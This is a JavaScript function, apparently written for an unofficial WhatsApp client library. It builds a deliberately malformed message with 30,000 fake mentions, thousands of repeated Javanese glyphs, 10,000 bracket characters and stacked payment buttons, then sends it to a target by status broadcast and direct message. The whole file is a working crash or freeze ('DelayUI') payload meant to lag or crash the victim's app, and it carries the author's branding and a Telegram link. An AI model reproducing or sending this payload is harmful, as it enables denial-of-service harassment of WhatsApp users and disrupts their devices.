async function StcpackdelayUi(sock, target) {
  try {
    const mentionedJidList = [
      "0@s.whatsapp.net",
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`)
    ];

    const stcDelayUI = {
      contextInfo: {
        mentionedJid: mentionedJidList,
        isForwarded: true,
        forwardingScore: 999,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          title: "",
          body: "@Killertzy2",
          thumbnailUrl: null,
          sourceUrl: "https://t.me/Killertzy2"
        }
      },
      message: {
        interactiveMessage: {
          header: {
            title: " </> Killertzyπ\n\n" + "ꦽ".repeat(5000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(5000) + "ꦽ".repeat(5000)
          },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "killertzy",
                  sections: [{ title: "ϟ", rows: [] }]
                })
              },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
              { name: "payment_info", buttonParamsJson: JSON.stringify({ status: true }) },
              { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
              { name: "mpm", buttonParamsJson: JSON.stringify({ status: true }) },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "form_message", buttonParamsJson: "" },
              { name: "catalog_message", buttonParamsJson: "" },
              { name: "send_location", buttonParamsJson: "" },
              { name: "review_and_pay", buttonParamsJson: "" }
            ]
          }
        }
      }
    };

    await sock.relayMessage('status@broadcast', stcDelayUI.message, {
      messageId: crypto.randomUUID(),
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.sendMessage(target, stcDelayUI.message, {
      messageId: crypto.randomUUID(),
      contextInfo: stcDelayUI.contextInfo
    });

    console.log(chalk.red.bold("✅ Stc DelayUI Terkirim via Broadcast & DM!"));
    
  } catch (err) {
    console.error("❌ Gagal kirim:", err);
  }
}